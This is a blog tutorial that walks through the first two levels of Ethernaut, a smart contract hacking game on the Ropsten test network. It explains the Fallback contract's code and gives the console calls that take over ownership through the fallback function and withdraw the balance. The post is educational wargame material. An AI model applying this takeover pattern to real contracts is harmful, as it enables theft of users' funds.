---
layout: post
title: How to Hack Ethereum Contracts the Easy Way
published: true
tags: Solidity Ethereum
image_url: /images/400-300px/charles-dickens-desk-400-300.png
excerpt: >-
  I walk through the first level of Ethernaut, a game where you have to hack smart contracts to survive :unlock: :muscle:
---

Ethernaut is a game that allows you learn about smart contract security by teaching you how to hack smart contracts :computer::wrench::smirk::bulb::money_with_wings:

I love Ethernaut. I love that it has a Rick and Morty Difficulty meter:

![Rick and Morty difficulty](/images/2018-04-28-How-To-Hack-Ethereum-Contracts-The-Easy-Way/rickmortydifficulty.jpg)

I love the psychedelic console message styling.

<span style="color: rgba(255, 255, 255, 0.85); font-weight: bold; font-size: 14px; text-shadow: 3px 2px red; background: #006;">
⛏️ Sent transaction ⛏ </span>

<span style="color: rgba(255, 255, 255, 0.85); font-weight: bold; font-size: 14px; text-shadow: 3px 2px red; background: #006;">
⛏️ Mined transaction ⛏ 
</span>

And I love that the name was inspired from [a weird comic from the 50s](https://en.wikipedia.org/wiki/The_Eternaut) about an alien invasion with killer snow.

![Eternaut Comic](/images/2018-04-28-How-To-Hack-Ethereum-Contracts-The-Easy-Way/ethernaut.jpg)

## Level 0 - Hello Ethernaut

I'm going to assume that you've got some basic coding skills and knowledge of Solidity (the language used to code in Ethereum).  [Crypto Zombies](https://cryptozombies.io/) is a great introduction if you are completely new to smart contracts. 

Alright then, let's get started! [**Hello Ethernaut**](https://ethernaut.zeppelin.solutions/level/0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c) is a practice run to get acquainted with the game interface. You'll need to set up a [MetaMask](https://metamask.io) account, if you don't have one already. Choose the **Ropsten Test Network** and [get some test ether from this faucet](https://faucet.metamask.io/).
Follow [the level instructions](https://ethernaut.zeppelin.solutions/level/0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c) closely and you should be fine. It's fairly straightforward.

Each level has it's own contract. You can interact with contracts by calling their methods:
```javascript
await contract.theMethodName()
```
The password for this level can be found with:
```javascript
await contract.password() // "ethernaut0"
```
And we can use that to authenticate:

```javascript
await contract.authenticate("ethernaut0")
```
Here's a screen shot of what you should see:

![First level complete](/images/2018-04-28-How-To-Hack-Ethereum-Contracts-The-Easy-Way/first-level-complete-slim.png)

## Level 1 - Fallback

Once you're familiar with the mechanics of the game, it's time to jump into the first level proper: **Fallback**. This a great opportunity to brush up on some concepts like:
- [contract ownership](#the-contract-owner)
- [the contract ABI](#the-abi)
- [working with numbers in Solidity/Web3](#Side-Note-Numbers-in-Web3)
- [the fallback method](#the-fallback-method)

I'm going to go through this level's contract with a fine tooth comb. If you just want to know how to complete the level, you can skip to [the solution here.](#the-solution) But if you really want to grok Solidity, you need to get your coding hands dirty.

### Checking the balance

Let's get started by checking the level's contract balance. We can do this with the command:
```javascript
await getBalance(instance) // "0"
```
A big round 0! I guess we're just doing this for bragging rights!
Pro tip: `instance` is equivalent to `contract.address`.

 If you like, you can check your own balance as well:

```javascript
await getBalance(player)
```
## The Contract Owner

To beat this level we need to claim ownership of the contract, so we need to know what that means!

There is no inherit contract owner property in Solidity. However, since there are certain actions that you will only want the contract owner to be allowed to do, it makes sense to set an owner address with special privileges.

Open Zeppelin have created `Ownable.sol`, an [open source resource](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/ownership/Ownable.sol) for this purpose.

It's included in the contract with:
```javascript
import  'zeppelin-solidity/contracts/ownership/Ownable.sol';
```

In the `Ownable` contract, a public address named `owner` is declared:
```javascript
address public owner;
```
`owner` is used as a mechanism to ensure that only the contract owner can execute some functions by using the function modifier:

```javascript
modifier onlyOwner() {
	require(msg.sender == owner);
	_;
}
```
It's used in the `withdraw()` function for example:
```javascript
function withdraw() public onlyOwner { //...
```
so that only the contract owner can withdraw funds from the contract.

The  `Ownable()` function assigns ownership to the `msg.sender`.
```javascript
function Ownable() public {
	owner = msg.sender;
}
```
The function `Ownable()` is used when the contract is declared,
```javascript
contract Fallback is Ownable { //...
```
And as a result the contract's owner will be assigned to whomever creates the contract.


## The ABI

So now we understand how the contract has an owner. Let's have a look at the contract's **ABI** (**A**pplication **B**inary **I**nterface). You can think of the ABI as a low-level type of API. The ABI includes all of the contracts methods, as well as its constructor and events.
We can log the ABI contents in a table format with:

```javascript
console.table(contract.abi)
```
So what's in this ABI? Six functions, a constructor, a fallback, and an event.

{: .table .table-bordered .table-dark}
|constant |type |name  |inputs |outputs |payable |stateMutability| anonymous |
|--|--|--|--|--|--|--| --|
| true | function | contributions|  1 |1 |false | view|  |
| |constructor||0|  |false|nonpayable|
| false | function | contribute |  0 |0 |true |payable |  |
| true| function | getContribution |  0 | 1|false | view|  |
| false | function | withdraw | 0| 0|false |nonpayable |  |
| |fallback|||  |true|payable|
| true | function | owner |  0 | 1|false | view|  |
|false| function| transferOwnership|1| 0 |false |nonpayable | 
| |event|OwnershipTransferred|2|  |||false

The columns detail the various interface properties.Let's go through them one by one:

 - A true **constant** value indicates the method will *not* modify the blockchain. As a result you can `call` this method without using any gas. **constant** has already been deprecated in favour of **stateMutability**, detailed further down, but is still included for backward compatibility.
  - **type** indicates what type of interface it is. It can be a function, constructor, a fallback method (we'll come back to this later), or an event.
  - **name** is pretty self-explanatory. Note that the constructor and fallback don't have names.
  - **inputs** and **outputs** specify the number of function arguments that are expected and outputted respectively.
  - **payable** specifies whether you will have to pay to run this function.
  - **stateMutability** is used as a replacement for **constant**. `pure` is used for functions where state isn't even read (e.g. safeMath type functions) whereas `view` is used for functions which don't change state but do read from it. A contract property can also be `nonpayable` , meaning that it will cost gas to access it, but you can't send any money to it.
  - **anonymous** only applies to events. Let's leave this for now.

Ok, onto the methods!

## The Methods

### `contributions(address)`

If we look at the source code Open Zeppelin provides, we can see that `contributions` is actually a public mapping.
```javascript
mapping(address => uint) public contributions;
```
We can access this mapping like a function. If we pass an `address` to it, we will get a `uint`.

I can see what my contributions are with:

```javascript
await contract.contributions(player);
```

{: .table .table-bordered .table-dark}
| (index) | Value | 0 | length  |
|--|--|--|--|
| c |  | 0 | 1 |
| e | 0 |  |  |
| s | 1 |  |  |

### Side Note: Numbers in Web3

Wait a second, what? We got an object with three properties. Why didn't we get a number? Because [Web3 uses BigNumber for number values.](https://github.com/ethereum/wiki/wiki/JavaScript-API#a-note-on-big-numbers-in-web3js) 

> You will always get a BigNumber object for number values as JavaScript is not able to handle big numbers correctly.

Note: you can log the contributions as a table with:
```javascript
console.table(await contract.contributions(player));
```
The three BigNumber properties represent the coefficient, the exponent, and the sign. An example from the [BigNumber README](https://github.com/MikeMcl/bignumber.js/#use):

```javascript
x = new BigNumber(-123.456);
x.c       // [ 123, 45600000000000 ]  coefficient
x.e       //  2                       exponent
x.s       // -1                       sign
```

We haven't contributed anything yet, so we would expect our coefficient to be zero, and indeed it is. How about the contract owner's contribution?

```javascript
console.table(await contract.contributions(await contract.owner()));
```

{: .table .table-bordered .table-dark}
| (index) | Value | 0 | length |
|--|--|--|--|
| c |  | 10000000 | 1 |
| e | 21 |  |  |
| s | 1 |  |  |

Remember the **c** value just represents the coefficient. We need to apply the exponent (**e**) to determine the actual value. We can convert these numbers to strings so they are easier to read:

```javascript
(await contract.contributions(player))
.toString(); // "0"
(await contract.contributions(await contract.owner()))
.toString(); // "1e+21"
```
So basically we've found out that the owner has a lot more contributions than we do :D

### Wei, Gwei and Ether

It's important to note that the owner's 10<sup>21</sup> contributions are in wei. There are 10<sup>18</sup>, or one **quintillion**, wei in one ether. You could also say that an ether is one Exawei (Exa as in Exabyte).

Note that gas price is typically in Gwei (Gigawei), which is 10<sup>9</sup>  wei, or a **billion** wei.

{: .table .table-bordered .table-dark}
| Unit | Amount (Wei) | Prefix | Description |
|--|--|--|--|
| Wei| 1 |  |
| Gwei | 1,000,000,000 | Giga | Billion |
| Ether | 1,000,000,000 ,000,000,000  | Exa | Quintillion |


### Constructor

Since the contract is called Fallback, the name of the constructor is `Fallback`. This is confusing in this case, since we also have a fallback (lower case) method, which is nameless. A contract's fallback is **always nameless.**

The constructor contains the instructions to be executed when the contract is initialized. We see that when initialized it assigns 1000 ether to `msg.sender` (who is also the contract owner):
```javascript
contributions[msg.sender] = 1000 * (1 ether);
```
This is why the contract owner has so much more contributions than we do!

So the owner has one thousand ether in their contribution. It's still a lot but not a crazy amount.


### `contribute()`

Ok, so maybe we should make a contribution ourselves. Here's the code for `contribute()`:

```javascript
function contribute() public payable { 
	require(msg.value < 0.001 ether); 
	contributions[msg.sender] += msg.value; 
	if(contributions[msg.sender] > contributions[owner]) { 
	owner = msg.sender; 
	} 
}
```
Let's go through this function line by line. 
First of all, the `msg.value` has to be less than 0.001 ether:

```javascript
require(msg.value < 0.001 ether); 
```
So we can't contribute more than ~0.001 ether at a time. The `contributions` of the sender are increased by whatever value was sent :
```javascript
contributions[msg.sender] += msg.value; 
```

Finally, if the `contributions` of the `sender` are more than the `contributions` of the `owner`, the contract's' ownership will pass to the `sender`.
```javascript
if(contributions[msg.sender] > contributions[owner]) { 
	owner = msg.sender; 
} 
```
Is there any way for the contributions of the sender to exceed that of the owner? As we saw in the constructor, when the contract is initialized 1000 ether is assigned to the contract's owner. Since we can't increase our `contributions` by more than ~.001 ether at a time, it will take us over a million contributions for our contributions to exceed the owner's!
Hopefully there is an easier way...

Let's make a contribution anyway, just to keep up appearances. We can make a contribution with:

```javascript
await contract.contribute.sendTransaction({value: toWei(.0009)});
```
We need to use `sendTransaction()` so we can specify how much ether we want to send. `sendTransaction()` requires the payment amount in wei, so we convert our 0.0009 ether (just below the 0.001 threshold) to wei with `toWei()`.

### `getContribution()`

`getContribution` simply returns the current contributions value of the `sender`.

```javascript
function getContribution() public view returns (uint) { 
	return contributions[msg.sender]; 
}
```
We can use `getContribution` to make sure our contribution has gone through:
```javascript
await contract.getContribution()
```
It's really just a convenience method, however. We can check our contribution just as easily with:

```javascript
await contract.contributions(player)
```
### `withdraw()`

```javascript
function withdraw() public onlyOwner { 
owner.transfer(this.balance); 
}
```
There's a couple of variables here we haven't seen before:

- `transfer()` : a global function that can be used to transfer to any address.
- `this` : the current contract.
- `balance` : the property of an address (in Wei).

The function transfers the entire balance at the contract's address to that of it's owner. We can't use this at the moment, since we aren't the owner, so let's move on!

### The Fallback Method

Finally we get to the fallback method! This is what the Fallback level is all about, after all.

Every contract can have a function that is used as a fallback if the contract is sent a request that doesn't match any of it's methods. It is a function of last resort. The fallback function is not allowed to take any arguments or to return any outputs. 

Let's have a look at this contract's fallback method:

```javascript
function() payable public { 
	require(msg.value > 0 && contributions[msg.sender] > 0); 
	owner = msg.sender; 
}
```
It assigns ownership to whomever invokes it! **However**, it requires the message value to be greater than zero, and the contributions of the sender to be greater than zero. 
We've already made a contribution, so all we have to do is make sure the message value is greater than zero.
To invoke the callback function, we simply send the contract a transaction using the `sendTransaction()` method:
```javascript
await contract.sendTransaction({value: 1});
```
We can just send 1 wei and still pass the requirement.

## The Solution

We've covered a lot of ground! Let's review the steps to complete the level.

![Scarface gives advice](/images/2018-04-28-How-To-Hack-Ethereum-Contracts-The-Easy-Way/scarface.jpg)

1. We send a contribution using the `contribute()` method chained with `sendTransaction()` so that we can specify the amount.
```javascript
await contract.contribute.sendTransaction({value: 1});
```
Methods that are payable are called with a [`sendTransaction()` method](https://github.com/ethereum/wiki/wiki/JavaScript-API#web3ethsendtransaction).
2. Now that our `contributions[msg.sender]` is greater than zero, we can invoke the fallback method by sending the contract an amount:
```javascript
await contract.sendTransaction({value: 1});
```
Now we are the owner of the contract. We can check to make sure with:
```javascript
(await contract.owner() === player) // true
```
3. Now we can withdraw the money!
```javascript
await contract.withdraw()
```
![Level Completed](/images/2018-04-28-How-To-Hack-Ethereum-Contracts-The-Easy-Way/level-completed-message.png)